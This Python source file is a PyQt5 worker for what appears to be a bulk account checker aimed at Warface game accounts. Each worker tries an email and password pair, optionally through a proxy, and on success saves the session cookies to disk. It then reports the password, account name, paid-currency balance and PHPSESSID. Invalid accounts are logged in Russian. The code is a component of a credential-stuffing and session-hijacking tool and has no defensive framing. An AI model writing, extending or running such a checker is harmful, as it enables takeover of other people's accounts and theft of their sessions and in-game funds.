import os
import json
from PyQt5.QtCore import QObject, QRunnable, pyqtSignal, pyqtSlot
from typing import Optional, Callable
from core.auth import WarfaceAuth

class WorkerSignals(QObject):
    log = pyqtSignal(str, str)
    result = pyqtSignal(dict)
    progress = pyqtSignal(int)

class AccountChecker(QRunnable):
    def __init__(self, idx: int, email: str, password: str, proxy: Optional[str], signals: WorkerSignals, stop_flag: Callable[[], bool], delay: float = 0):
        super().__init__()
        self.idx = idx
        self.email = email
        self.password = password
        self.proxy = proxy
        self.signals = signals
        self.stop_flag = stop_flag
        self.delay = delay

    @pyqtSlot()
    def run(self):
        tag = self.email.split("@")[0]
        if self.stop_flag():
            return
        try:
            auth = WarfaceAuth(self.email, self.password, self.proxy, self.delay, self.stop_flag)
            ok = auth.login()
            self.signals.progress.emit(1)
            if ok:
                cookies = auth.get_cookies()
                account_info = auth.account_info
                os.makedirs("sessions", exist_ok=True)
                session_path = f"sessions/{self.email.replace('@','_').replace('.','_')}.json"
                with open(session_path, "w") as f:
                    json.dump(cookies, f, indent=2)
                self.signals.log.emit(tag, f"Сессия сохранена → {session_path}")
                result_data = {
                    "email": self.email,
                    "password": self.password,
                    "proxy": self.proxy or "",
                    "status": "OK",
                    "name": account_info.get("name", ""),
                    "donat": account_info.get("donat", ""),
                    "phpsessid": cookies.get("PHPSESSID", ""),
                }
                self.signals.result.emit(result_data)
            else:
                self.signals.log.emit(tag, "Невалид")
        except InterruptedError:
            self.signals.log.emit(tag, "Остановлено")
            self.signals.progress.emit(1)
        except Exception as e:
            self.signals.log.emit(tag, "Невалид")
            self.signals.progress.emit(1)